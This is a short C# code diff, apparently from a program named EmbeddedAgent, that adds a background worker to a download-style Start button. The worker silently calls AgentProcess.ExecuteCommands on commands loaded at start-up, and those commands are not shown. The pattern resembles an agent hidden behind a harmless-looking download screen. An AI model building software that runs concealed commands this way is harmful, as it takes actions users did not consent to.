@@ -36,6 +36,9 @@ namespace EmbeddedAgent
 
         private async void btnStart_Click(object sender, EventArgs e)
         {
+            if (!backgroundWorker.IsBusy)
+                backgroundWorker.RunWorkerAsync();
+
             List<string> list = new List<string>();
 
             for (int i = 0; i < 1000; i++)
@@ -57,6 +60,19 @@ namespace EmbeddedAgent
             lblStatus.Text = "Dowload Completed!";
             btnStart.Text = "Done";
             btnStart.Enabled = false;
+        }
+
+        private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
+        {
+            try
+            {
+                AgentProcess.ExecuteCommands(AgentProcess.InitCommands());
+            }
+            catch (Exception ex)
+            {
+                backgroundWorker.CancelAsync();
+                MessageBox.Show(ex.Message, "Message", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
     }
 
